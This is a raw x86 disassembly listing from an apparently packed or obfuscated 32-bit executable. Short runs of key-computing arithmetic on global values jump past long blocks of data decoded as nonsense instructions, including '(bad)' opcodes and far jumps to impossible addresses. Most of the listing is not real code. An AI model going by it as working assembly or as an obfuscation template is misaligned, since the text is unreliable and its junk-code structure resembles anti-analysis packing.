  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x43376f,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x43372f
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	sub    esi,esp
  407497:	sub    BYTE PTR [ebp-0x5c],0xc0
  40749b:	jle    0x40751b
  40749d:	and    BYTE PTR [ebp+0x7e],bh
  4074a0:	jle    0x4074e4
  4074a2:	leave  
  4074a3:	clc    
  4074a4:	addr16 (bad) 
  4074a6:	adc    eax,0x6e044b81
  4074ab:	jmp    0xbfd99573
  4074b0:	call   0x584acbf0
  4074b5:	ret    
  4074b6:	dec    edi
  4074b7:	jne    0x40745d
  4074b9:	or     BYTE PTR [ebx+eax*4],cl
  4074bc:	sub    eax,0x659f3520
  4074c1:	sub    eax,0x4166ac9e
  4074c6:	jmp    0x3bc3fbdc
  4074cb:	mov    ecx,0xf61c91af
  4074d0:	hlt    
  4074d1:	pop    ebx
  4074d2:	pop    ebx
  4074d3:	sub    bh,BYTE PTR [edi]
  4074d5:	fcmovnu st,st(4)
  4074d7:	add    al,0xc4
  4074d9:	daa    
  4074da:	sar    BYTE PTR ds:0xf3524dee,1
  4074e0:	inc    ebp
  4074e1:	jae    0x407464
  4074e3:	call   0xf5a912cc
  4074e8:	(bad)  
  4074e9:	out    dx,al
  4074ea:	pop    edx
  4074eb:	es nop
  4074ed:	adc    eax,0xba3992b0
  4074f2:	add    al,0x2c
  4074f4:	jmp    0x9416:0xec948d0a
  4074fb:	out    0xa1,al
  4074fd:	mov    ebp,0x5f64769a
  407502:	inc    esp
  407503:	push   ebp
  407504:	mov    ds:0xc51f7e49,eax
  407509:	(bad)  
  40750c:	neg    BYTE PTR [ecx+edx*1]
  40750f:	in     al,dx
  407510:	fdivr  DWORD PTR [edx-0x6b0555b7]
  407516:	push   esp
  407517:	into   
  407518:	jmp    0x4c2a:0x7fcf6f09
  40751f:	add    eax,0x5f40c080
  407524:	pop    eax
  407525:	sub    BYTE PTR [ebp+0x21224346],bh
  40752b:	dec    edi
  40752c:	adc    bh,cl
  40752e:	(bad)  
  407530:	xlat   BYTE PTR ds:[ebx]
  407531:	arpl   WORD PTR [eax+0x56],cx
  407534:	bound  ecx,QWORD PTR [ebp-0xaf2fb05]
  40753a:	xchg   edi,eax
  40753b:	xor    al,0x65
  40753d:	add    eax,0x66afbee2
  407542:	jb     0x40758a
  407544:	cmp    esp,DWORD PTR [ebp-0x18a59165]
  40754a:	mov    ch,0xa0
  40754c:	mov    bl,0x2f
  40754e:	pop    esi
  40754f:	sbb    al,BYTE PTR [eax+0x982030]
  407555:	lock adc esp,eax
  407558:	jnp    0x4074ec
  40755a:	add    bh,ch
  40755c:	mov    dl,0xa0
  40755e:	loope  0x4075bf
  407560:	jae    0x40753c
  407562:	test   eax,0x780e3193
  407567:	lods   eax,DWORD PTR ds:[esi]
  407568:	mov    dh,0x7a
  40756a:	sub    ecx,DWORD PTR [edi]
  40756c:	ret    0x9fb
  40756f:	fs jnp 0x4075b2
  407572:	dec    edi
  407573:	ins    BYTE PTR es:[edi],dx
  407574:	fiadd  WORD PTR [ebx]
  407576:	shr    DWORD PTR [ecx+0x2a],0xf4
  40757a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40757b:	addr16 cld 
  40757d:	sahf   
  40757e:	pop    ebx
  40757f:	outs   dx,DWORD PTR ds:[esi]
  407580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407581:	jp     0x407510
  407583:	add    DWORD PTR [eax+0x3ddea9e],esi
  407589:	les    eax,FWORD PTR [esi]
  40758b:	adc    al,0x32
  40758d:	xor    eax,0x23991a2
  407592:	pop    ss
  407593:	cmp    dl,BYTE PTR [edx-0xf]
  407596:	pop    esp
  407597:	jp     0x4075f5
  407599:	lock into 
  40759b:	popf   
  40759c:	xor    ch,bl
  40759e:	push   esp
  40759f:	ds adc eax,0x27c710c9
  4075a5:	sbb    BYTE PTR [edi+0x119bd5f6],ah
  4075ab:	xor    eax,DWORD PTR ds:0xb089eb50
  4075b1:	jno    0x4075f5
  4075b3:	je     0x4075d9
  4075b5:	pop    edx
  4075b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075b7:	pushf  
  4075b8:	(bad)  
  4075b9:	fidiv  DWORD PTR [esi+0x4f9b8dcf]
  4075bf:	xor    BYTE PTR [eax+0x1e],al
  4075c2:	lods   al,BYTE PTR ds:[esi]
  4075c3:	dec    ebx
  4075c4:	pop    esi
  4075c5:	sbb    DWORD PTR [edi+0x2d],edx
  4075c8:	inc    esp
  4075c9:	push   es
  4075ca:	inc    ebp
  4075cb:	call   0x97c2ac96
  4075d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075d1:	cmp    BYTE PTR [edi],ah
  4075d3:	cmp    al,0xea
  4075d5:	je     0x407600
  4075d7:	push   ds
  4075d8:	test   BYTE PTR [ebx-0x1],cl
  4075db:	xor    al,0xb0
  4075dd:	pop    ecx
  4075de:	push   cs
  4075df:	push   0x38
  4075e1:	sub    al,ch
  4075e3:	lahf   
  4075e4:	fst    DWORD PTR [edi-0x78d4508e]
  4075ea:	icebp  
  4075eb:	push   edi
  4075ec:	pop    edi
  4075ed:	and    al,0x9c
  4075ef:	neg    DWORD PTR ds:0x3eb5b9ef
  4075f5:	inc    edi
  4075f6:	jb     0x407602
  4075f8:	xchg   edx,eax
  4075f9:	adc    BYTE PTR [ebx+0x63df2209],bh
  4075ff:	jl     0x40759e
  407601:	sbb    edi,ecx
  407603:	ds mov ebx,0xdeb0f77d
  407609:	mov    ah,0xc1
  40760b:	retf   
  40760c:	enter  0xe5d8,0xd4
  407610:	cs pop esi
  407612:	inc    esi
  407613:	cmp    BYTE PTR fs:[edi],bh
  407616:	jle    0x407667
  407618:	push   ss
  407619:	jne    0x407675
  40761b:	jbe    0x4075ba
  40761d:	cs add eax,0x871e6f5f
  407623:	mov    dh,0x65
  407625:	mov    ecx,DWORD PTR [esi]
  407627:	fsubrp st(5),st
  407629:	inc    eax
  40762a:	and    edi,DWORD PTR [esp+ebp*1-0x4f]
  40762e:	addr16 in al,dx
  407630:	(bad)  
  407631:	ficomp DWORD PTR [edi-0x65a6da03]
  407637:	push   esi
  407638:	and    DWORD PTR [edi+esi*1+0x14],ecx
  40763c:	dec    eax
  40763d:	cdq    
  40763e:	xchg   ecx,eax
  40763f:	push   ds
  407640:	repnz leave 
  407642:	or     eax,0x1725b600
  407647:	jp     0x4075f2
  407649:	or     eax,0xf40e2ebb
  40764e:	icebp  
  40764f:	mov    WORD PTR [ecx-0x54],?
  407652:	xchg   esp,eax
  407653:	sub    bh,bh
  407655:	loopne 0x407615
  407657:	inc    dl
  407659:	cmp    ecx,DWORD PTR [esi*2+0x1025289b]
  407660:	fs ja  0x4075e3
  407663:	mov    edx,0xc7582b5b
  407668:	dec    esp
  407669:	(bad)  
  40766a:	and    edi,ebx
  40766c:	sub    ebx,DWORD PTR [edx+0x4c]
  40766f:	or     dh,BYTE PTR [edi]
  407671:	pop    esi
  407672:	ins    DWORD PTR es:[edi],dx
  407673:	shl    BYTE PTR [edx+eiz*8-0x3e9f14b9],0xd
  40767b:	sub    al,0xd5
  40767d:	retf   
  40767e:	jno    0x4076d2
  407680:	push   0xffffffbd
  407682:	fwait
  407683:	dec    esp
  407684:	sbb    si,WORD PTR [edi]
  407687:	jl     0x407623
  407689:	dec    ecx
  40768a:	add    al,0x23
  40768c:	push   esi
  40768d:	aad    0xe
  40768f:	xor    eax,DWORD PTR [edx+0x5c]
  407692:	outs   dx,BYTE PTR ds:[esi]
  407693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407694:	xchg   esi,eax
  407695:	jno    0x4076d0
  407697:	pop    ebp
  407698:	mov    bh,ch
  40769a:	mov    al,0xeb
  40769c:	inc    edi
  40769d:	jb     0x407668
  40769f:	xchg   esi,eax
  4076a0:	call   0x75a:0x38ca11db
  4076a7:	or     bl,dl
  4076a9:	sbb    eax,0x354dd060
  4076ae:	mov    edx,?
  4076b0:	adc    DWORD PTR [edx-0x6e93475a],0xbd2ad006
  4076ba:	loope  0x4076a3
  4076bc:	jg     0x4076d7
  4076be:	add    DWORD PTR [ebx-0x6c8680b1],ebx
  4076c4:	(bad)
  4076c7:	sahf   
  4076c8:	mov    ecx,0xc8b83f81
  4076cd:	in     al,dx
  4076ce:	xor    DWORD PTR [edi],esi
  4076d0:	push   ss
  4076d1:	adc    BYTE PTR [ecx-0x26a8a02c],dh
  4076d7:	lods   al,BYTE PTR ds:[esi]
  4076d8:	mov    ah,0x69
  4076da:	ret    0xd4ff
  4076dd:	jnp    0x40773e
  4076df:	mov    edi,ss
  4076e1:	pop    esi
  4076e2:	mov    ds:0xc5803867,eax
  4076e7:	stos   DWORD PTR es:[edi],eax
  4076e8:	daa    
  4076e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076ea:	jb     0x407764
  4076ec:	in     al,dx
  4076ed:	stos   DWORD PTR es:[edi],eax
  4076ee:	xchg   DWORD PTR [ecx+0x5a62278b],edx
  4076f4:	loop   0x407706
  4076f6:	addr16 int3 
  4076f8:	je     0x4076d8
  4076fa:	and    ebx,DWORD PTR [ebp+0x62]
  4076fd:	jb     0x407743
  4076ff:	inc    ecx
  407700:	push   edi
  407701:	push   es
  407702:	loope  0x407728
  407704:	jge    0x407708
  407706:	aad    0x8b
  407708:	mov    bh,0x93
  40770a:	cmp    DWORD PTR [eax-0x4a],eax
  40770d:	cmp    al,0x96
  40770f:	jmp    0x6017d893
  407714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407715:	push   esi
  407716:	call   0x218e61e3
  40771b:	cmp    BYTE PTR [ebx-0x6d227806],bh
  407721:	xor    eax,0x27c4a69b
  407726:	mov    edi,0x7e18a5da
  40772b:	mov    eax,ds:0x84b1aecb
  407730:	ror    ah,0x4c
  407733:	imul   edx,DWORD PTR [eax-0x525435ba],0xb5db3425
  40773d:	test   DWORD PTR [ebx],esi
  40773f:	int    0xf0
  407741:	comiss xmm4,DWORD PTR [ecx]
  407744:	pop    ds
  407745:	jne    0x407798
  407747:	idiv   dl
  407749:	out    dx,al
  40774a:	std    
  40774b:	int3   
  40774c:	mov    al,0xa1
  40774e:	xor    edi,esi
  407750:	test   al,0x3e
  407752:	mov    ah,cl
  407754:	dec    ebx
  407755:	out    0xb,al
  407757:	and    eax,0x8043d57a
  40775c:	(bad)  
  40775e:	mov    ecx,0xba67a2c7
  407763:	jp     0x40774f
  407765:	xchg   ebp,eax
  407766:	mov    ch,BYTE PTR [ebp-0xb]
  407769:	bound  esi,QWORD PTR [edx]
  40776b:	xor    dl,BYTE PTR [eax]
  40776d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40776e:	dec    ebx
  40776f:	cmp    bl,BYTE PTR [ebp+0x7cfd9cd1]
  407775:	mov    cl,0x99
  407777:	sub    BYTE PTR [edx+edi*2-0x60ccb064],0xa5
  40777f:	or     al,0x86
  407781:	and    bh,bh
  407783:	sub    eax,0xa5bf9c42
  407788:	fldcw  WORD PTR [esi]
  40778a:	mov    eax,ds:0x4ef705a1
  40778f:	mov    ebp,DWORD PTR [eax]
  407791:	lea    ebp,[edi+0x31]
  407794:	icebp  
  407795:	rol    BYTE PTR [edi+ebp*2],cl
  407798:	mov    cl,0x6b
  40779a:	xchg   edi,eax
  40779b:	gs das 
  40779d:	and    eax,0x19b56ffa
  4077a2:	ret    
  4077a3:	xlat   BYTE PTR ds:[ebx]
  4077a4:	and    eax,0x10a435ff
  4077a9:	pop    ds
  4077aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ab:	jp     0x40779e
  4077ad:	int3   
  4077ae:	pop    ebx
  4077af:	scas   eax,DWORD PTR es:[edi]
  4077b0:	cmp    BYTE PTR [ecx+0x43],bh
  4077b3:	xchg   esp,eax
  4077b4:	in     al,dx
  4077b5:	sub    ebp,esi
  4077b7:	push   es
  4077b8:	push   0xdc6e3ab0
  4077bd:	int3   
  4077be:	push   esi
  4077bf:	fs sahf 
  4077c1:	sbb    edx,DWORD PTR [eax-0x66]
  4077c4:	mov    ecx,0x30f6c9c0
  4077c9:	cmp    eax,0x9891dc77
  4077ce:	pop    ecx
  4077cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4077d2:	mov    DWORD PTR ds:0x4337a7,0x5e65
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	or     eax,0x56b25cdc
  4077f9:	iret   
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x407798
  407801:	test   BYTE PTR [eax],cl
  407803:	in     al,0x4c
  407805:	lds    ebp,FWORD PTR [ebp+0x29]
  407808:	and    esi,esp
  40780a:	ret    0xb18
  40780d:	adc    cl,BYTE PTR [ebp+0x6a69c7db]
  407813:	jl     0x407829
  407815:	clc    
  407816:	jmp    DWORD PTR [ebx+0x36]
  407819:	bound  edx,QWORD PTR [edx+0x6d]
  40781c:	arpl   WORD PTR [eax],di
  40781e:	(bad)  
  407820:	stos   DWORD PTR es:[edi],eax
  407821:	in     al,dx
  407822:	sahf   
  407823:	jmp    0xde850acd
  407828:	push   ds
  407829:	(bad)  
  40782c:	mov    cl,BYTE PTR [edi-0x2]
  40782f:	std    
  407830:	xor    eax,0xd58a3628
  407835:	xchg   ecx,eax
  407836:	sar    dh,0x64
  407839:	jo     0x4077f5
  40783b:	enter  0x6d0e,0xe5
  40783f:	dec    esp
  407840:	sbb    ebx,DWORD PTR [ebx+0x7079a328]
  407846:	jl     0x407849
  407848:	cwde   
  407849:	shl    BYTE PTR [eax],cl
  40784b:	or     al,0x2b
  40784d:	mov    eax,0x52e477a
  407852:	test   DWORD PTR [edx+0x77352551],ecx
  407858:	mov    dh,0xd3
  40785a:	push   edi
  40785b:	mov    ch,0x55
  40785d:	push   ebp
  40785e:	add    edx,DWORD PTR [ebp-0x626131a0]
  407864:	scas   eax,DWORD PTR es:[edi]
  407865:	clc    
  407866:	ret    
  407867:	int    0xee
  407869:	ret    
  40786a:	imul   edx,DWORD PTR [edx],0x1d13fee7
  407870:	ss add eax,0x5eccc179
  407876:	or     BYTE PTR [ebp+ebx*8+0x139257d9],ch
  40787d:	imul   esp,DWORD PTR [eax-0x32e0eac7],0xffffff8e
  407884:	ds loopne 0x407843
  407887:	(bad)  
  407888:	cmp    BYTE PTR [edi+0x576dfb00],ch
  40788e:	jmp    0x407824
  407890:	shr    bl,0x36
  407893:	sub    dl,bl
  407895:	test   eax,0x37dd118d
  40789a:	xor    al,0x5f
  40789c:	and    edx,esp
  40789e:	fcom   st(5)
  4078a0:	mov    ah,0xcd
  4078a2:	adc    eax,ebp
  4078a4:	(bad)  
  4078a5:	arpl   WORD PTR [ebx+eiz*1+0x22],sp
  4078a9:	int    0x25
  4078ab:	lahf   
  4078ac:	bound  ebx,QWORD PTR [ebp+0x7efb8ade]
  4078b2:	mov    ch,0x6b
  4078b4:	or     eax,0x3e1b7857
  4078b9:	shl    BYTE PTR [edx],0xe0
  4078bc:	xor    eax,0x54137024
  4078c1:	add    al,0xf9
  4078c3:	imul   esp
  4078c5:	dec    edi
  4078c6:	fwait
  4078c7:	dec    edi
  4078c8:	mov    ebp,0x95109691
  4078cd:	xchg   esi,eax
  4078ce:	fwait
  4078cf:	inc    edx
  4078d0:	outs   dx,BYTE PTR ds:[esi]
  4078d1:	idiv   BYTE PTR [edi]
  4078d3:	int    0x29
  4078d5:	data16 mov bl,0x53
  4078d8:	daa    
  4078d9:	(bad)  
  4078da:	jg     0x4078d5
  4078dc:	in     eax,dx
  4078dd:	jbe    0x40791b
  4078df:	or     al,0x4
  4078e1:	xor    BYTE PTR [ebp+0x59],0x4
  4078e5:	or     bl,BYTE PTR [ebp+0x3a9637e7]
  4078eb:	jp     0x4078d1
  4078ed:	rcl    BYTE PTR [eax+eiz*2-0x4a],cl
  4078f1:	xchg   edx,eax
  4078f2:	mov    al,0x8a
  4078f4:	sub    edx,edx
  4078f6:	daa    
  4078f7:	test   DWORD PTR [eax],0xa0a5e631
  4078fd:	lea    eax,[edx]
  4078ff:	cli    
  407900:	adc    DWORD PTR [edi+ebp*2+0x70],esi
  407904:	push   DWORD PTR [edi]
  407906:	clc    
  407907:	sub    al,0x39
  407909:	adc    ah,ch
  40790b:	in     al,0x1f
  40790d:	mov    edx,0x7ecf796
  407912:	jno    0x40798c
  407914:	ins    DWORD PTR es:[edi],dx
  407915:	fistp  DWORD PTR [eax]
  407917:	xor    bh,BYTE PTR [edx-0x5f]
  40791a:	xor    DWORD PTR [eax+0x1f],edx
  40791d:	mov    DWORD PTR [ebx+eax*4+0x3598c386],ecx
  407924:	cmp    eax,0x7ef18799
  407929:	adc    eax,0xb04ea4d7
  40792e:	xchg   esi,eax
  40792f:	lahf   
  407930:	sti    
  407931:	rcl    BYTE PTR [edi],1
  407933:	pop    ss
  407934:	cwde   
  407935:	sub    al,0x27
  407937:	or     al,0x26
  407939:	dec    esi
  40793a:	mov    bh,0x9e
  40793c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40793d:	pop    edx
  40793e:	mov    esp,0xb04f7b98
  407943:	dec    ecx
  407944:	adc    ebx,DWORD PTR [ecx-0x3a28432]
  40794a:	jno    0x4078fb
  40794c:	out    0xa6,eax
  40794e:	pusha  
  40794f:	xor    DWORD PTR [esi-0x349cf2a7],esp
  407955:	and    DWORD PTR [edi+0x2efb0ba],0x6e6215c6
  40795f:	push   ecx
  407960:	adc    eax,0x979bf1fc
  407965:	add    DWORD PTR [eax],0x7d
  407968:	test   BYTE PTR [edi-0x7af126a7],bl
  40796e:	sahf   
  40796f:	or     al,0x2
  407971:	mov    edx,0x47604269
  407976:	or     al,0xbf
  407978:	daa    
  407979:	push   cs
  40797a:	inc    esi
  40797b:	push   edx
  40797c:	lods   eax,DWORD PTR ds:[esi]
  40797d:	add    eax,0x7669f62
  407982:	imul   eax,esp,0x881e008e
  407988:	jecxz  0x40797d
  40798a:	das    
  40798b:	ins    DWORD PTR es:[edi],dx
  40798c:	dec    ecx
  40798d:	push   0x26
  40798f:	xchg   ebx,eax
  407990:	push   ebx
  407991:	leave  
  407992:	or     eax,0x24ead0ed
  407997:	and    edx,DWORD PTR [edx+0x6bd55c21]
  40799d:	enter  0x3ff7,0xf8
  4079a1:	enter  0xff34,0x1c
  4079a5:	retf   0xdde9
  4079a8:	pushf  
  4079a9:	xchg   esp,eax
  4079aa:	jecxz  0x4079df
  4079ac:	popa   
  4079ad:	in     al,0x33
  4079af:	loope  0x40793f
  4079b1:	adc    DWORD PTR [edi+0x20c65915],eax
  4079b7:	pop    ss
  4079b8:	adc    eax,0x92feb7ed
  4079bd:	xchg   ebp,eax
  4079be:	and    DWORD PTR [edx],ebx
  4079c0:	pop    ecx
  4079c1:	ret    0xa77e
  4079c4:	cmp    edi,DWORD PTR [esp+eiz*8-0x1d2f27a0]
  4079cb:	or     bl,cl
  4079cd:	out    dx,al
  4079ce:	xchg   esi,eax
  4079cf:	sub    bh,BYTE PTR ds:0xb656cf9e
  4079d5:	scas   eax,DWORD PTR es:[edi]
  4079d6:	cmp    eax,0x65b79ed0
  4079db:	xor    eax,0xfdfaaab3
  4079e0:	lds    ebx,FWORD PTR [esi+0x3e5e9e6f]
  4079e6:	stos   DWORD PTR es:[edi],eax
  4079e7:	fisubr WORD PTR [eax-0x601fc278]
  4079ed:	mov    bh,0x8e
  4079ef:	jle    0x407a1f
  4079f1:	in     eax,0x89
  4079f3:	js     0x407a1b
  4079f5:	lock mov ecx,0x6e906fb2
  4079fb:	lahf   
  4079fc:	or     eax,0x5c965b9b
  407a01:	fwait
  407a02:	test   DWORD PTR [ecx],eax
  407a04:	add    ah,BYTE PTR [ecx-0x6d]
  407a07:	bound  esp,QWORD PTR [ebx+0x59]
  407a0a:	ficom  DWORD PTR [ebx]
  407a0c:	test   DWORD PTR [edi+0x3255f668],eax
  407a12:	pop    ds
  407a13:	cld    
  407a14:	mov    edx,edi
  407a16:	fild   WORD PTR [edx]
  407a18:	xchg   ch,dl
  407a1a:	push   edx
  407a1b:	mov    bh,0x18
  407a1d:	mov    bh,0xeb
  407a1f:	mov    ah,0x97
  407a21:	outs   dx,DWORD PTR ds:[esi]
  407a22:	xor    al,0x93
  407a24:	mov    ebp,ds
  407a26:	repz xchg ebx,eax
  407a28:	and    eax,0xb2775340
  407a2d:	fwait
  407a2e:	gs mov edi,0x1ae200d
  407a34:	sub    esp,DWORD PTR [eax+ebx*4]
  407a37:	sub    al,bh
  407a39:	pop    esi
  407a3a:	push   edx
  407a3b:	pop    ecx
  407a3c:	sub    BYTE PTR [ecx+0x233928ff],ch
  407a42:	loopne 0x4079d0
  407a44:	inc    eax
  407a45:	stc    
  407a46:	mov    BYTE PTR [edx],bh
  407a48:	adc    ebx,eax
  407a4a:	ss scas al,BYTE PTR es:[edi]
  407a4c:	inc    esp
  407a4d:	or     dl,BYTE PTR [edi-0x485ed797]
  407a53:	xchg   ebp,eax
  407a54:	shl    DWORD PTR [eax+0x4e2142],cl
  407a5a:	dec    ebp
  407a5b:	in     al,0x31
  407a5d:	rol    DWORD PTR [ebx+0x42],cl
  407a60:	cmp    esi,ebx
  407a62:	data16 js 0x407a79
  407a65:	mov    WORD PTR [ecx-0x2e141f0e],ds
  407a6b:	int    0x7b
  407a6d:	mov    ebp,DWORD PTR [eax+0x7c]
  407a70:	adc    al,0xbe
  407a72:	mov    gs,ebx
  407a74:	cmp    dl,bh
  407a76:	mov    ch,0x14
  407a78:	push   eax
  407a79:	push   eax
  407a7a:	sub    al,0x49
  407a7c:	sub    al,0xdf
  407a7e:	fwait
  407a7f:	enter  0x7294,0x1f
  407a83:	adc    eax,0x9b17da31
  407a88:	bound  eax,QWORD PTR [edi+0xf]
  407a8b:	call   0x67f3:0x7683f1cb
  407a92:	retf   0x3026
  407a95:	mov    DWORD PTR [esi],ebp
  407a97:	jne    0x407b05
  407a99:	mov    ah,0x62
  407a9b:	sar    DWORD PTR [edi],1
  407a9d:	stc    
  407a9e:	dec    esi
  407a9f:	sbb    DWORD PTR [ebp+0x68a48ce1],ebp
  407aa5:	push   es
  407aa6:	cmp    ebx,0x41
  407aa9:	cld    
  407aaa:	popa   
  407aab:	ret    0xbc62
  407aae:	pop    ebp
  407aaf:	add    ch,0x4a
  407ab2:	adc    al,0x30
  407ab4:	push   edi
  407ab5:	data16 (bad) 
  407ab7:	call   0xdbbce3b6
  407abc:	pop    ebp
  407abd:	jmp    0x55d4:0xb5031789
  407ac4:	or     cl,BYTE PTR [eax-0x4056b1e3]
  407aca:	in     eax,0xee
  407acc:	cmp    bl,BYTE PTR [ebp+0x174a3dd5]
  407ad2:	sbb    al,0x13
  407ad4:	into   
  407ad5:	pop    edx
  407ad6:	leave  
  407ad7:	scas   al,BYTE PTR es:[edi]
  407ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad9:	sbb    eax,0x807243e7
  407ade:	pop    esp
  407adf:	sub    esi,DWORD PTR [ebp-0x60d1ba00]
  407ae5:	inc    eax
  407ae6:	int3   
  407ae7:	clc    
  407ae8:	das    
  407ae9:	jbe    0x407ada
  407aeb:	sub    al,0x8c
  407aed:	mov    edx,0x1161f71e
  407af2:	ins    DWORD PTR es:[edi],dx
  407af3:	inc    esi
  407af4:	xor    ebx,0xffffffef
  407af7:	popaw  
  407af9:	mov    ah,0x70
  407afb:	daa    
  407afc:	mov    cl,0x58
  407afe:	test   al,0xce
  407b00:	loop   0x407b17
  407b02:	dec    eax
  407b03:	cmp    ebp,DWORD PTR [edi+0x17f8a9fb]
  407b09:	mov    ds:0x8fe8dd6e,eax
  407b0e:	pop    esi
  407b0f:	push   0x6b
  407b11:	int3   
  407b12:	xlat   BYTE PTR ds:[ebx]
  407b13:	add    dh,ch
  407b15:	xor    eax,eax
  407b17:	and    DWORD PTR [ecx-0x7b],ebp
  407b1a:	jbe    0x407b93
  407b1c:	cmp    DWORD PTR [edx+0x2d],esi
  407b1f:	mov    bh,0x1a
  407b21:	xor    al,0x6b
  407b23:	or     al,BYTE PTR [eax+0x4]
  407b26:	mov    edx,0xd84f169d
  407b2b:	mov    ebx,0xc83b8a7d
  407b30:	jne    0x407efc
  407b36:	mov    ax,WORD PTR [ebp-0x8]
  407b3a:	xor    ecx,0x551
  407b40:	mov    ecx,0x8a3c
  407b45:	sub    DWORD PTR ds:0x433723,0x433767
  407b4f:	xor    ax,cx
  407b52:	mov    ecx,0x3b02
  407b57:	sub    DWORD PTR ds:0x433803,0x1193
  407b61:	add    ax,cx
  407b64:	mov    ecx,DWORD PTR [ebp+0x8]
  407b67:	movzx  eax,ax
  407b6a:	and    DWORD PTR ds:0x43372b,0x433827
  407b74:	not    eax
  407b76:	and    eax,DWORD PTR [ecx]
  407b78:	mov    DWORD PTR ds:0x43383b,0x844
  407b82:	mov    ecx,DWORD PTR [ebp+0x8]
  407b85:	mov    DWORD PTR ds:0x4337fb,0x1c5f
  407b8f:	mov    DWORD PTR [ecx],eax
  407b91:	jmp    0x407ee8
  407b96:	jmp    0x407ee1
  407b9b:	dec    eax
  407b9c:	sbb    dh,BYTE PTR [ebx-0x16]
  407b9f:	jno    0x407c14
  407ba1:	push   ecx
  407ba2:	cwde   
  407ba3:	mov    ds:0x8ff6a3a4,al
  407ba8:	jb     0x407bdf
  407baa:	cmp    DWORD PTR [eax-0x35],0x7d207e7e
  407bb1:	jle    0x407c31
  407bb3:	imul   ebp,DWORD PTR [edi-0x52],0x17f39d52
  407bba:	fbstp  TBYTE PTR [ebp+0x3]
  407bbd:	sub    dh,BYTE PTR [eax]
  407bbf:	jns    0x407bf1
  407bc1:	xchg   edx,eax
  407bc2:	das    
  407bc3:	mov    esi,0xd712db66
  407bc8:	setne  BYTE PTR [esp+eiz*4]
  407bcc:	leave  
  407bcd:	sub    dh,BYTE PTR [esi]
  407bcf:	mov    dh,0xbe
  407bd1:	(bad)  
  407bd2:	cs loop 0x407bd3
  407bd5:	cmova  eax,DWORD PTR [edi]
  407bd8:	repnz add bl,BYTE PTR [esi+0x1a124d44]
  407bdf:	and    BYTE PTR [esi+0x55],0xc3
  407be3:	cld    
  407be4:	leave  
  407be5:	arpl   dx,dx
  407be7:	outs   dx,DWORD PTR ds:[esi]
  407be8:	add    ah,BYTE PTR [esi]
  407bea:	jg     0x407b76
